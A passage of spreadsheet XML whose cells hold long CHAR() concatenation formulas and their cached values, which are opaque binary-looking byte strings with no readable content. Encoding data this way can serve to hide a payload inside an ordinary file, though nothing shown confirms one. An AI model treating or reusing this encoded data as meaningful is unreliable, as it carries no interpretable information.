)&amp;CHAR(214)&amp;CHAR(28)&amp;CHAR(156)&amp;CHAR(69)&amp;CHAR(64)&amp;CHAR(32)&amp;CHAR(252)&amp;CHAR(255)&amp;CHAR(247)&amp;CHAR(83)&amp;CHAR(102)&amp;CHAR(230)&amp;CHAR(86)&amp;CHAR(143)&amp;CHAR(20)&amp;CHAR(171)&amp;CHAR(124)&amp;CHAR(15)&amp;CHAR(156)&amp;CHAR(164)&amp;CHAR(243)&amp;CHAR(146)&amp;CHAR(233)&amp;CHAR(193)&amp;CHAR(246)&amp;CHAR(93)&amp;CHAR(24)&amp;CHAR(123)&amp;CHAR(85)&amp;CHAR(105)&amp;CHAR(160)&amp;CHAR(242)&amp;CHAR(82)&amp;CHAR(221)&amp;CHAR(170)&amp;CHAR(50)&amp;CHAR(81)&amp;CHAR(60)&amp;CHAR(174)&amp;CHAR(193)&amp;CHAR(117)&amp;CHAR(65)&amp;CHAR(246)&amp;CHAR(239)&amp;CHAR(98)&amp;CHAR(116)&amp;CHAR(142)&amp;CHAR(23)&amp;CHAR(163)&amp;CHAR(193)&amp;CHAR(63)&amp;CHAR(40)&amp;CHAR(97)&amp;CHAR(158)&amp;CHAR(159)&amp;CHAR(248)&amp;CHAR(219)&amp;CHAR(164)&amp;CHAR(159)&amp;CHAR(187)&amp;CHAR(58)&amp;CHAR(171)&amp;CHAR(6)&amp;CHAR(17)&amp;CHAR(232)&amp;CHAR(93)&amp;CHAR(43)&amp;CHAR(31)&amp;CHAR(246)&amp;CHAR(18)&amp;CHAR(158)&amp;CHAR(35)&amp;CHAR(91)&amp;CHAR(82)&amp;CHAR(243)&amp;CHAR(128)&amp;CHAR(63)&amp;CHAR(94)&amp;CHAR(255)&amp;CHAR(151)&amp;CHAR(224)&amp;CHAR(218)&amp;CHAR(6)&amp;CHAR(171)&amp;CHAR(188)&amp;CHAR(14)&amp;CHAR(198)&amp;CHAR(90)&amp;CHAR(112)&amp;CHAR(191)&amp;CHAR(196)</f>
        <v>,P–˜.È_x0014_ËhÅ_x0011__9Šý|=‡ñÙ¯ÑA_x0005_¼*_x0005_‹ï)V*±nüs·­_x001B_cs#kÞ‘L_x0005_MÂÈ_x0006__x000C__x001C_F+_x001D_~. ),Îê_x0012_"_x0012_—!f[´ÉL!©«_x0010__x001E_†ñyß!_x0013_dÄ_x0014_Ñ´D:Mš@ÿT_x000C_¿mYRS˜É,_x0007_’i_x0008__x001B_B£ß_x0012_àQH»M3(5BÄš©kß÷—ËÌÁ"–hIRt‚Ù
³‰lÑ–_x001E_ø=_x0004_7ƒÒ†zT%_x0016_¦»Ö_x001C_œE@ üÿ÷SfæV_x0014_«|_x000F_œ¤ó’éÁö]_x0018_{Ui òRÝª2Q&lt;®ÁuAöïbtŽ_x0017_£Á?(ažŸøÛ¤Ÿ»:«_x0006__x0011_è]+_x001F_ö_x0012_ž#[Ró€?^ÿ—àÚ_x0006_«¼_x000E_ÆZp¿Ä</v>
      </c>
      <c r="DG43" t="str">
        <f>CHAR(215)&amp;CHAR(158)&amp;CHAR(148)&amp;CHAR(255)&amp;CHAR(156)&amp;CHAR(15)&amp;CHAR(58)&amp;CHAR(52)&amp;CHAR(18)&amp;CHAR(8)</f>
        <v>×ž”ÿœ_x000F_:4_x0012__x0008_</v>
      </c>
      <c r="DH43" t="s">
        <v>42</v>
      </c>
    </row>
    <row r="44" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DF44" t="str">
        <f>CHAR(78)&amp;CHAR(227)&amp;CHAR(219)&amp;CHAR(254)&amp;CHAR(153)&amp;CHAR(227)&amp;CHAR(164)&amp;CHAR(168)&amp;CHAR(121)&amp;CHAR(25)&amp;CHAR(57)&amp;CHAR(3)&amp;CHAR(9)&amp;CHAR(34)&amp;CHAR(220)&amp;CHAR(131)&amp;CHAR(73)&amp;CHAR(222)&amp;CHAR(89)&amp;CHAR(91)&amp;CHAR(149)&amp;CHAR(79)&amp;CHAR(172)&amp;CHAR(48)&amp;CHAR(113)&amp;CHAR(86)&amp;CHAR(117)&amp;CHAR(27)&amp;CHAR(162)&amp;CHAR(182)&amp;CHAR(68)&amp;CHAR(25)&amp;CHAR(166)&amp;CHAR(65)&amp;CHAR(186)&amp;CHAR(23)&amp;CHAR(65)&amp;CHAR(105)&amp;CHAR(85)&amp;CHAR(200)&amp;CHAR(3)&amp;CHAR(79)&amp;CHAR(15)&amp;CHAR(206)&amp;CHAR(241)&amp;CHAR(206)&amp;CHAR(59)&amp;CHAR(101)&amp;CHAR(54)&amp;CHAR(12)&amp;CHAR(204)&amp;CHAR(162)&amp;CHAR(15)&amp;CHAR(239)&amp;CHAR(56)&amp;CHAR(197)&amp;CHAR(53)&amp;CHAR(53)&amp;CHAR(4)&amp;CHAR(255)&amp;CHAR(240)&amp;CHAR(92)&amp;CHAR(13)&amp;CHAR(27)&amp;CHAR(151)&amp;CHAR(224)&amp;CHAR(148)&amp;CHAR(29)&amp;CHAR(13)&amp;CHAR(27)&amp;CHAR(149)&amp;CHAR(28)&amp;CHAR(114)&amp;CHAR(213)&amp;CHAR(130)&amp;CHAR(74)&amp;CHAR(112)&amp;CHAR(134)&amp;CHAR(198)&amp;CHAR(203)&amp;CHAR(174)&amp;CHAR(162)&amp;CHAR(208)&amp;CHAR(81)&amp;CHAR(199)&amp;CHAR(12)&amp;CHAR(251)&amp;CHAR(199)&amp;CHAR(170)&amp;CHAR(10)&amp;CHAR(226)&amp;CHAR(8)&amp;CHAR(168)&amp;CHAR(86)&amp;CHAR(56)&amp;CHAR(47)&amp;CHAR(24)&amp;CHAR(103)&amp;CHAR(171)&amp;CHAR(85)&amp;CHAR(88)&amp;CHAR(168)&amp;CHAR(208)&amp;CHAR(89)&amp;CHAR(54)&amp;CHAR(102)&amp;CHAR(131)&amp;CHAR(106)&amp;CHAR(8)&amp;CHAR(139)&amp;CHAR(46)&amp;CHAR(53)&amp;CHAR(255)&amp;CHAR(35)&amp;CHAR(70)&amp;CHAR(64)&amp;CHAR(174)&amp;CHAR(61)&amp;CHAR(30)&amp;CHAR(28)&amp;CHAR(74)&amp;CHAR(152)&amp;CHAR(223)&amp;CHAR(198)&amp;CHAR(77)&amp;CHAR(125)&amp;CHAR(147)&amp;CHAR(218)&amp;CHAR(165)&amp;CHAR(128)&amp;CHAR(236)&amp;CHAR(76)&amp;CHAR(85)&amp;CHAR(61)&amp;CHAR(203)&amp;CHAR(197)&amp;CHAR(192)&amp;CHAR(235)&amp;CHAR(196)&amp;CHAR(209)&amp;CHAR(24)&amp;CHAR(87)&amp;CHAR(130)&amp;CHAR(150)&amp;CHAR(28)&amp;CHAR(99)&amp;CHAR(137)&amp;CHAR(146)&amp;CHAR(76)&amp;CHAR(135)&amp;CHAR(96)&amp;CHAR(77)&amp;CHAR(66)&amp;CHAR(75)&amp;CHAR(102)&amp;CHAR(85)&amp;CHAR(76)&amp;CHAR(193)&amp;CHAR(252)&amp;CHAR(156)&amp;CHAR(129)&amp;CHAR(253)&amp;CHAR(69)&amp;CHAR(97)&amp;CHAR(111)&amp;CHAR(30)&amp;CHAR(30)&amp;CHAR(35)&amp;CHAR(15)&amp;CHAR(170)&amp;CHAR(70)&amp;CHAR(32)&amp;CHAR(74)&amp;CHAR(183)&amp;CHAR(124)&amp;CHAR(168)&amp;CHAR(198)&amp;CHAR(37)&amp;CHAR(34)&amp;CHAR(58)&amp;CHAR(124)&amp;CHAR(47)&amp;CHAR(109)&amp;CHAR(122)&amp;CHAR(181)&amp;CHAR(202)&amp;CHAR(28)&amp;CHAR(247)&amp;CHAR(44)&amp;CHAR(139)&amp;CHAR(74)&amp;CHAR(64)&amp;CHAR(213)&amp;CHAR(80)&amp;CHAR(140)&amp;CHAR(215)&amp;CHAR(7)&amp;CHAR(34)&amp;CHAR(155)&amp;CHAR(130)&amp;CHAR(73)&amp;CHAR(216)&amp;CHAR(190)&amp;CHAR(209)&amp;CHAR(33)&amp;CHAR(2)&amp;CHAR(185)&amp;CHAR(183)&amp;CHAR(206)&amp;CHAR(124)&amp;CHAR(164)&amp;CHAR(97)&amp;CHAR(4)&amp;CHAR(79)&amp;CHAR(114)&amp;CHAR(120)&amp;CHAR(249)&amp;CHAR(35)&amp;CHAR(66)&amp;CHAR(93)&amp;CHAR(63)&amp;CHAR(79)&amp;CHAR(241)&amp;CHAR(146)&amp;CHAR(127)&amp;CHAR(8)&amp;CHAR(124)&amp;CHAR(228)&amp;CHAR(13)&amp;CHAR(108)&amp;CHAR(123)&amp;CHAR(105)&amp;CHAR(241)&amp;CHAR(87)&amp;CHAR(112)&amp;CHAR(244)&amp;CHAR(235)&amp;CHAR(22)&amp;CHAR(7)&amp;CHAR(110)&amp;CHAR(127)&amp;CHAR(85)&amp;CHAR(43)&amp;CHAR(13)&amp;CHAR(72)&amp;CHAR(20)&amp;CHAR(154)&amp;CHAR(184)&amp;CHAR(248)&amp;CHAR(70)&amp;CHAR(19)&amp;CHAR(56)&amp;CHAR(28)&amp;CHAR(183)&amp;CHAR(105)</f>
        <v>NãÛþ™ã¤¨y_x0019_9_x0003_	"ÜƒIÞY[•O¬0qVu_x001B_¢¶D_x0019_¦Aº_x0017_AiUÈ_x0003_O_x000F_ÎñÎ;e6_x000C_Ì¢_x000F_ï8Å55_x0004_ÿð\_x000D__x001B_—à”_x001D__x000D__x001B_•_x001C_rÕ‚Jp†ÆË®¢ÐQÇ_x000C_ûÇª
â_x0008_¨V8/_x0018_g«UX¨ÐY6fƒj_x0008_‹.5ÿ#F@®=_x001E__x001C_J˜ßÆM}“Ú¥€ìLU=ËÅÀëÄÑ_x0018_W‚–_x001C_c‰’L‡`MBKfULÁüœýEao_x001E__x001E_#_x000F_ªF J·|¨Æ%":|/mzµÊ_x001C_÷,‹J@ÕPŒ×_x0007_"›‚IØ¾Ñ!_x0002_¹·Î|¤a_x0004_Orxù#B]?Oñ’_x0008_|ä_x000D_l{iñWpôë_x0016__x0007_nU+_x000D_H_x0014_š¸øF_x0013_8_x001C_·i</v>
      </c>
      <c r="DG44" t="str">
        <f>CHAR(184)&amp;CHAR(209)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(130)&amp;CHAR(241)&amp;CHAR(146)&amp;CHAR(212)&amp;CHAR(84)&amp;CHAR(215)</f>
        <v>¸ÑÕ†‚ñ’ÔT×</v>
      </c>
      <c r="DH44" t="s">
        <v>43</v>
      </c>
    </row>
    <row r="45" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DF45" t="str">
        <f>CHAR(220)&amp;CHAR(243)&amp;CHAR(18)&amp;CHAR(39)&amp;CHAR(23)&amp;CHAR(227)&amp;CHAR(186)&amp;CHAR(91)&amp;CHAR(37)&amp;CHAR(123)&amp;CHAR(92)&amp;CHAR(209)&amp;CHAR(47)&amp;CHAR(243)&amp;CHAR(79)&amp;CHAR(6)&amp;CHAR(80)&amp;CHAR(250)&amp;CHAR(15)&amp;CHAR(78)&amp;CHAR(209)&amp;CHAR(107)&amp;CHAR(180)&amp;CHAR(184)&amp;CHAR(162)&amp;CHAR(49)&amp;CHAR(19)&amp;CHAR(7)&amp;CHAR(134)&amp;CHAR(83)&amp;CHAR(10)&amp;CHAR(84)&amp;CHAR(122)&amp;CHAR(240)&amp;CHAR(213)&amp;CHAR(193)&amp;CHAR(230)&amp;CHAR(182)&amp;CHAR(50)&amp;CHAR(140)&amp;CHAR(192)&amp;CHAR(182)&amp;CHAR(12)&amp;CHAR(54)&amp;CHAR(136)&amp;CHAR(8)&amp;CHAR(25)&amp;CHAR(149)&amp;CHAR(48)&amp;CHAR(52)&amp;CHAR(169)&amp;CHAR(74)&amp;CHAR(107)&amp;CHAR(101)&amp;CHAR(138)&amp;CHAR(39)&amp;CHAR(210)&amp;CHAR(153)&amp;CHAR(31)&amp;CHAR(109)&amp;CHAR(79)&amp;CHAR(231)&amp;CHAR(79)&amp;CHAR(198)&amp;CHAR(254)&amp;CHAR(142)&amp;CHAR(28)&amp;CHAR(20)&amp;CHAR(160)&amp;CHAR(74)&amp;CHAR(73)&amp;CHAR(125)&amp;CHAR(47)&amp;CHAR(88)&amp;CHAR(87)&amp;CHAR(7)&amp;CHAR(208)&amp;CHAR(86)&amp;CHAR(237)&amp;CHAR(44)&amp;CHAR(84)&amp;CHAR(29)&amp;CHAR(201)&amp;CHAR(90)&amp;CHAR(14)&amp;CHAR(39)&amp;CHAR(215)&amp;CHAR(250)&amp;CHAR(220)&amp;CHAR(118)&amp;CHAR(92)&amp;CHAR(130)&amp;CHAR(49)&amp;CHAR(227)&amp;CHAR(34)&amp;CHAR(49)&amp;CHAR(172)&amp;CHAR(149)&amp;CHAR(199)&amp;CHAR(41)&amp;CHAR(34)&amp;CHAR(251)&amp;CHAR(9)&amp;CHAR(68)&amp;CHAR(135)&amp;CHAR(21)&amp;CHAR(84)&amp;CHAR(151)&amp;CHAR(136)&amp;CHAR(46)&amp;CHAR(183)&amp;CHAR(183)&amp;CHAR(241)&amp;CHAR(74)&amp;CHAR(94)&amp;CHAR(249)&amp;CHAR(24)&amp;CHAR(142)&amp;CHAR(186)&amp;CHAR(197)&amp;CHAR(151)&amp;CHAR(142)&amp;CHAR(63)&amp;CHAR(61)&amp;CHAR(7)&amp;CHAR(12)&amp;CHAR(190)&amp;CHAR(118)&amp;CHAR(7)&amp;CHAR(79)&amp;CHAR(11)&amp;CHAR(188)&amp;CHAR(228)&amp;CHAR(35)&amp;CHAR(33)&amp;CHAR(97)&amp;CHAR(199)&amp;CHAR(70)&amp;CHAR(168)&amp;CHAR(175)&amp;CHAR(185)&amp;CHAR(15)&amp;CHAR(88)&amp;CHAR(53)&amp;CHAR(226)&amp;CHAR(236)&amp;CHAR(161)&amp;CHAR(174)&amp;CHAR(84)&amp;CHAR(217)&amp;CHAR(123)&amp;CHAR(51)&amp;CHAR(221)&amp;CHAR(8)&amp;CHAR(162)&amp;CHAR(54)&amp;CHAR(14)&amp;CHAR(1)&amp;CHAR(239)&amp;CHAR(60)&amp;CHAR(20)&amp;CHAR(151)&amp;CHAR(125)&amp;CHAR(165)&amp;CHAR(174)&amp;CHAR(78)&amp;CHAR(152)&amp;CHAR(239)&amp;CHAR(89)&amp;CHAR(62)&amp;CHAR(234)&amp;CHAR(118)&amp;CHAR(159)&amp;CHAR(153)&amp;CHAR(39)&amp;CHAR(234)&amp;CHAR(254)&amp;CHAR(132)&amp;CHAR(8)&amp;CHAR(1)&amp;CHAR(113)&amp;CHAR(114)&amp;CHAR(126)&amp;CHAR(36)&amp;CHAR(23)&amp;CHAR(5)&amp;CHAR(86)&amp;CHAR(209)&amp;CHAR(179)&amp;CHAR(74)&amp;CHAR(214)&amp;CHAR(116)&amp;CHAR(196)&amp;CHAR(251)&amp;CHAR(28)&amp;CHAR(226)&amp;CHAR(126)&amp;CHAR(57)&amp;CHAR(38)&amp;CHAR(195)&amp;CHAR(147)&amp;CHAR(199)&amp;CHAR(15)&amp;CHAR(49)&amp;CHAR(185)&amp;CHAR(201)&amp;CHAR(231)&amp;CHAR(31)&amp;CHAR(151)&amp;CHAR(17)&amp;CHAR(135)&amp;CHAR(90)&amp;CHAR(24)&amp;CHAR(251)&amp;CHAR(101)&amp;CHAR(45)&amp;CHAR(158)&amp;CHAR(33)&amp;CHAR(247)&amp;CHAR(103)&amp;CHAR(47)&amp;CHAR(193)&amp;CHAR(172)&amp;CHAR(122)&amp;CHAR(4)&amp;CHAR(63)&amp;CHAR(226)&amp;CHAR(62)&amp;CHAR(209)&amp;CHAR(61)&amp;CHAR(178)&amp;CHAR(203)&amp;CHAR(167)&amp;CHAR(99)&amp;CHAR(108)&amp;CHAR(31)&amp;CHAR(186)&amp;CHAR(140)&amp;CHAR(108)&amp;CHAR(97)&amp;CHAR(95)&amp;CHAR(146)&amp;CHAR(141)&amp;CHAR(72)&amp;CHAR(60)&amp;CHAR(52)&amp;CHAR(189)&amp;CHAR(80)&amp;CHAR(29)&amp;CHAR(210)&amp;CHAR(240)&amp;CHAR(223)&amp;CHAR(180)&amp;CHAR(216)&amp;CHAR(124)</f>
        <v>Üó_x0012_'_x0017_ãº[%{\Ñ/óO_x0006_Pú_x000F_NÑk´¸¢1_x0013__x0007_†S
TzðÕÁæ¶2ŒÀ¶_x000C_6ˆ_x0008__x0019_•04©JkeŠ'Ò™_x001F_mOçOÆþŽ_x001C__x0014_ JI}/XW_x0007_ÐVí,T_x001D_ÉZ_x000E_'×úÜv\‚1ã"1¬•Ç)"û	D‡_x0015_T—ˆ.··ñJ^ù_x0018_ŽºÅ—Ž?=_x0007__x000C_¾v_x0007_O_x000B_¼ä#!aÇF¨¯¹_x000F_X5âì¡®TÙ{3Ý_x0008_¢6_x000E__x0001_ï&lt;_x0014_—}¥®N˜ïY&gt;êvŸ™'êþ„_x0008__x0001_qr~$_x0017__x0005_VÑ³JÖtÄû_x001C_â~9&amp;Ã“Ç_x000F_1¹Éç_x001F_—_x0011_‡Z_x0018_ûe-ž!÷g/Á¬z_x0004_?â&gt;Ñ=²Ë§cl_x001F_ºŒla_’H&lt;4½P_x001D_Òðß´Ø|</v>
      </c>
      <c r="DG45" t="str">
        <f>CHAR(213)&amp;CHAR(110)&amp;CHAR(188)&amp;CHAR(130)&amp;CHAR(96)&amp;CHAR(226)&amp;CHAR(26)&amp;CHAR(230)&amp;CHAR(28)&amp;CHAR(60)</f>
        <v>Õn¼‚`â_x001A_æ_x001C_&lt;</v>
      </c>
      <c r="DH45" t="s">
        <v>44</v>
      </c>
    </row>
    <row r="46" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DF46" t="str">
        <f>CHAR(8)&amp;CHAR(91)&amp;CHAR(247)&amp;CHAR(79)&amp;CHAR(234)&amp;CHAR(213)&amp;CHAR(70)&amp;CHAR(184)&amp;CHAR(51)&amp;CHAR(72)&amp;CHAR(157)&amp;CHAR(114)&amp;CHAR(251)&amp;CHAR(62)&amp;CHAR(87)&amp;CHAR(47)&amp;CHAR(43)&amp;CHAR(149)&amp;CHAR(229)&amp;CHAR(146)&amp;CHAR(25)&amp;CHAR(20)&amp;CHAR(141)&amp;CHAR(29)&amp;CHAR(63)&amp;CHAR(231)&amp;CHAR(232)&amp;CHAR(37)&amp;CHAR(188)&amp;CHAR(87)&amp;CHAR(134)&amp;CHAR(163)&amp;CHAR(235)&amp;CHAR(29)&amp;CHAR(148)&amp;CHAR(119)&amp;CHAR(254)&amp;CHAR(66)&amp;CHAR(147)&amp;CHAR(29)&amp;CHAR(64)&amp;CHAR(189)&amp;CHAR(73)&amp;CHAR(105)&amp;CHAR(84)&amp;CHAR(240)&amp;CHAR(68)&amp;CHAR(42)&amp;CHAR(230)&amp;CHAR(115)&amp;CHAR(175)&amp;CHAR(142)&amp;CHAR(73)&amp;CHAR(133)&amp;CHAR(31)&amp;CHAR(134)&amp;CHAR(222)&amp;CHAR(194)&amp;CHAR(152)&amp;CHAR(206)&amp;CHAR(228)&amp;CHAR(166)&amp;CHAR(249)&amp;CHAR(71)&amp;CHAR(105)&amp;CHAR(107)&amp;CHAR(143)&amp;CHAR(107)&amp;CHAR(120)&amp;CHAR(96)&amp;CHAR(171)&amp;CHAR(47)&amp;CHAR(38)&amp;CHAR(60)&amp;CHAR(218)&amp;CHAR(156)&amp;CHAR(84)&amp;CHAR(195)&amp;CHAR(205)&amp;CHAR(69)&amp;CHAR(105)&amp;CHAR(226)&amp;CHAR(220)&amp;CHAR(205)&amp;CHAR(101)&amp;CHAR(126)&amp;CHAR(107)&amp;CHAR(218)&amp;CHAR(207)&amp;CHAR(223)&amp;CHAR(127)&amp;CHAR(80)&amp;CHAR(166)&amp;CHAR(95)&amp;CHAR(178)&amp;CHAR(71)&amp;CHAR(122)&amp;CHAR(18)&amp;CHAR(65)&amp;CHAR(110)&amp;CHAR(60)&amp;CHAR(39)&amp;CHAR(132)&amp;CHAR(10)&amp;CHAR(97)&amp;CHAR(239)&amp;CHAR(241)&amp;CHAR(117)&amp;CHAR(56)&amp;CHAR(83)&amp;CHAR(91)&amp;CHAR(111)&amp;CHAR(76)&amp;CHAR(59)&amp;CHAR(183)&amp;CHAR(121)&amp;CHAR(82)&amp;CHAR(66)&amp;CHAR(106)&amp;CHAR(174)&amp;CHAR(180)&amp;CHAR(108)&amp;CHAR(182)&amp;CHAR(160)&amp;CHAR(138)&amp;CHAR(158)&amp;CHAR(65)&amp;CHAR(188)&amp;CHAR(56)&amp;CHAR(140)&amp;CHAR(51)&amp;CHAR(58)&amp;CHAR(34)&amp;CHAR(173)&amp;CHAR(171)&amp;CHAR(107)&amp;CHAR(9)&amp;CHAR(220)&amp;CHAR(67)&amp;CHAR(200)&amp;CHAR(187)&amp;CHAR(238)&amp;CHAR(23)&amp;CHAR(132)&amp;CHAR(163)&amp;CHAR(242)&amp;CHAR(252)&amp;CHAR(116)&amp;CHAR(37)&amp;CHAR(221)&amp;CHAR(40)&amp;CHAR(65)&amp;CHAR(147)&amp;CHAR(20)&amp;CHAR(242)&amp;CHAR(141)&amp;CHAR(138)&amp;CHAR(200)&amp;CHAR(167)&amp;CHAR(84)&amp;CHAR(4)&amp;CHAR(232)&amp;CHAR(234)&amp;CHAR(68)&amp;CHAR(28)&amp;CHAR(142)&amp;CHAR(98)&amp;CHAR(121)&amp;CHAR(177)&amp;CHAR(150)&amp;CHAR(20)&amp;CHAR(51)&amp;CHAR(237)&amp;CHAR(39)&amp;CHAR(213)&amp;CHAR(33)&amp;CHAR(214)&amp;CHAR(59)&amp;CHAR(8)&amp;CHAR(153)&amp;CHAR(5)&amp;CHAR(176)&amp;CHAR(198)&amp;CHAR(225)&amp;CHAR(211)&amp;CHAR(220)&amp;CHAR(229)&amp;CHAR(58)&amp;CHAR(34)&amp;CHAR(32)&amp;CHAR(191)&amp;CHAR(74)&amp;CHAR(100)&amp;CHAR(125)&amp;CHAR(95)&amp;CHAR(209)&amp;CHAR(239)&amp;CHAR(63)&amp;CHAR(196)&amp;CHAR(93)&amp;CHAR(144)&amp;CHAR(133)&amp;CHAR(201)&amp;CHAR(171)&amp;CHAR(100)&amp;CHAR(30)&amp;CHAR(155)&amp;CHAR(209)&amp;CHAR(248)&amp;CHAR(4)&amp;CHAR(65)&amp;CHAR(243)&amp;CHAR(64)&amp;CHAR(63)&amp;CHAR(168)&amp;CHAR(109)&amp;CHAR(110)&amp;CHAR(56)&amp;CHAR(137)&amp;CHAR(140)&amp;CHAR(171)&amp;CHAR(45)&amp;CHAR(199)&amp;CHAR(218)&amp;CHAR(223)&amp;CHAR(251)&amp;CHAR(119)&amp;CHAR(168)&amp;CHAR(101)&amp;CHAR(200)&amp;CHAR(26)&amp;CHAR(107)&amp;CHAR(57)&amp;CHAR(164)&amp;CHAR(217)&amp;CHAR(77)&amp;CHAR(47)&amp;CHAR(212)&amp;CHAR(187)&amp;CHAR(246)&amp;CHAR(242)&amp;CHAR(89)&amp;CHAR(232)&amp;CHAR(203)&amp;CHAR(140)&amp;CHAR(156)&amp;CHAR(251)&amp;CHAR(4)&amp;CHAR(206)&amp;CHAR(57)&amp;CHAR(160)&amp;CHAR(169)&amp;CHAR(233)&amp;CHAR(29)&amp;CHAR(71)</f>
        <v>_x0008_[÷OêÕF¸3Hrû&gt;W/+•å’_x0019__x0014__x001D_?çè%¼W†£ë_x001D_”wþB“_x001D_@½IiTðD*æs¯ŽI…_x001F_†ÞÂ˜Îä¦ùGikkx`«/&amp;&lt;ÚœTÃÍEiâÜÍe~kÚÏßP¦_²Gz_x0012_An&lt;'„
aïñu8S[oL;·yRBj®´l¶ ŠžA¼8Œ3:"­«k	ÜCÈ»î_x0017_„£òüt%Ý(A“_x0014_òŠÈ§T_x0004_èêD_x001C_Žby±–_x0014_3í'Õ!Ö;_x0008_™_x0005_°ÆáÓÜå:" ¿Jd}_Ñï?Ä]…É«d_x001E_›Ñø_x0004_Aó@?¨mn8‰Œ«-ÇÚßûw¨eÈ_x001A_k9¤ÙM/Ô»öòYèËŒœû_x0004_Î9 ©é_x001D_G</v>
      </c>
      <c r="DG46" t="str">
        <f>CHAR(202)&amp;CHAR(127)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(19)&amp;CHAR(111)&amp;CHAR(213)&amp;CHAR(150)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>ÊŸ_x001D__x0013_oÕ–Ê|</v>
      </c>
      <c r="DH46" t="s">
        <v>45</v>
      </c>
    </row>
    <row r="47" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DF47" t="str">
        <f>CHAR(227)&amp;CHAR(47)&amp;CHAR(60)&amp;CHAR(188)&amp;CHAR(234)&amp;CHAR(254)&amp;CHAR(144)&amp;CHAR(109)&amp;CHAR(21)&amp;CHAR(28)&amp;CHAR(108)&amp;CHAR(103)&amp;CHAR(33)&amp;CHAR(135)&amp;CHAR(166)&amp;CHAR(113)&amp;CHAR(134)&amp;CHAR(175)&amp;CHAR(189)&amp;CHAR(57)&amp;CHAR(213)&amp;CHAR(130)&amp;CHAR(159)&amp;CHAR(216)&amp;CHAR(87)&amp;CHAR(146)&amp;CHAR(249)&amp;CHAR(17)&amp;CHAR(214)&amp;CHAR(60)&amp;CHAR(232)&amp;CHAR(81)&amp;CHAR(244)&amp;CHAR(139)&amp;CHAR(49)&amp;CHAR(23)&amp;CHAR(108)&amp;CHAR(153)&amp;CHAR(202)&amp;CHAR(97)&amp;CHAR(43)&amp;CHAR(71)&amp;CHAR(157)&amp;CHAR(111)&amp;CHAR(197)&amp;CHAR(174)&amp;CHAR(139)&amp;CHAR(133)&amp;CHAR(222)&amp;CHAR(45)&amp;CHAR(71)&amp;CHAR(94)&amp;CHAR(200)&amp;CHAR(186)&amp;CHAR(192)&amp;CHAR(154)&amp;CHAR(252)&amp;CHAR(254)&amp;CHAR(61)&amp;CHAR(102)&amp;CHAR(148)&amp;CHAR(48)&amp;CHAR(173)&amp;CHAR(127)&amp;CHAR(34)&amp;CHAR(54)&amp;CHAR(115)&amp;CHAR(11)&amp;CHAR(33)&amp;CHAR(214)&amp;CHAR(194)&amp;CHAR(113)&amp;CHAR(71)&amp;CHAR(48)&amp;CHAR(36)&amp;CHAR(135)&amp;CHAR(32)&amp;CHAR(153)&amp;CHAR(225)&amp;CHAR(119)&amp;CHAR(25)&amp;CHAR(223)&amp;CHAR(78)&amp;CHAR(90)&amp;CHAR(139)&amp;CHAR(37)&amp;CHAR(188)&amp;CHAR(82)&amp;CHAR(15)&amp;CHAR(21)&amp;CHAR(100)&amp;CHAR(8)&amp;CHAR(10)&amp;CHAR(180)&amp;CHAR(203)&amp;CHAR(114)&amp;CHAR(230)&amp;CHAR(88)&amp;CHAR(62)&amp;CHAR(109)&amp;CHAR(158)&amp;CHAR(185)&amp;CHAR(83)&amp;CHAR(114)&amp;CHAR(30)&amp;CHAR(157)&amp;CHAR(119)&amp;CHAR(126)&amp;CHAR(142)&amp;CHAR(10)&amp;CHAR(173)&amp;CHAR(80)&amp;CHAR(28)&amp;CHAR(218)&amp;CHAR(230)&amp;CHAR(143)&amp;CHAR(229)&amp;CHAR(86)&amp;CHAR(226)&amp;CHAR(25)&amp;CHAR(153)&amp;CHAR(142)&amp;CHAR(210)&amp;CHAR(232)&amp;CHAR(202)&amp;CHAR(122)&amp;CHAR(128)&amp;CHAR(64)&amp;CHAR(93)&amp;CHAR(88)&amp;CHAR(219)&amp;CHAR(181)&amp;CHAR(94)&amp;CHAR(158)&amp;CHAR(103)&amp;CHAR(190)&amp;CHAR(255)&amp;CHAR(124)&amp;CHAR(85)&amp;CHAR(123)&amp;CHAR(131)&amp;CHAR(8)&amp;CHAR(109)&amp;CHAR(140)&amp;CHAR(24)&amp;CHAR(253)&amp;CHAR(41)&amp;CHAR(86)&amp;CHAR(231)&amp;CHAR(75)&amp;CHAR(120)&amp;CHAR(156)&amp;CHAR(26)&amp;CHAR(178)&amp;CHAR(235)&amp;CHAR(47)&amp;CHAR(5)&amp;CHAR(95)&amp;CHAR(158)&amp;CHAR(20)&amp;CHAR(199)&amp;CHAR(242)&amp;CHAR(181)&amp;CHAR(198)&amp;CHAR(172)&amp;CHAR(145)&amp;CHAR(1)&amp;CHAR(170)&amp;CHAR(80)&amp;CHAR(147)&amp;CHAR(110)&amp;CHAR(225)&amp;CHAR(61)&amp;CHAR(53)&amp;CHAR(71)&amp;CHAR(115)&amp;CHAR(108)&amp;CHAR(239)&amp;CHAR(95)&amp;CHAR(31)&amp;CHAR(243)&amp;CHAR(11)&amp;CHAR(164)&amp;CHAR(80)&amp;CHAR(221)&amp;CHAR(28)&amp;CHAR(191)&amp;CHAR(141)&amp;CHAR(86)&amp;CHAR(63)&amp;CHAR(76)&amp;CHAR(210)&amp;CHAR(63)&amp;CHAR(109)&amp;CHAR(130)&amp;CHAR(46)&amp;CHAR(194)&amp;CHAR(195)&amp;CHAR(123)&amp;CHAR(13)&amp;CHAR(219)&amp;CHAR(110)&amp;CHAR(32)&amp;CHAR(26)&amp;CHAR(86)&amp;CHAR(115)&amp;CHAR(108)&amp;CHAR(194)&amp;CHAR(150)&amp;CHAR(13)&amp;CHAR(232)&amp;CHAR(12)&amp;CHAR(102)&amp;CHAR(220)&amp;CHAR(144)&amp;CHAR(38)&amp;CHAR(225)&amp;CHAR(62)&amp;CHAR(103)&amp;CHAR(129)&amp;CHAR(226)&amp;CHAR(48)&amp;CHAR(115)&amp;CHAR(45)&amp;CHAR(252)&amp;CHAR(105)&amp;CHAR(11)&amp;CHAR(42)&amp;CHAR(51)&amp;CHAR(94)&amp;CHAR(198)&amp;CHAR(197)&amp;CHAR(86)&amp;CHAR(246)&amp;CHAR(198)&amp;CHAR(229)&amp;CHAR(241)&amp;CHAR(215)&amp;CHAR(25)&amp;CHAR(67)&amp;CHAR(168)&amp;CHA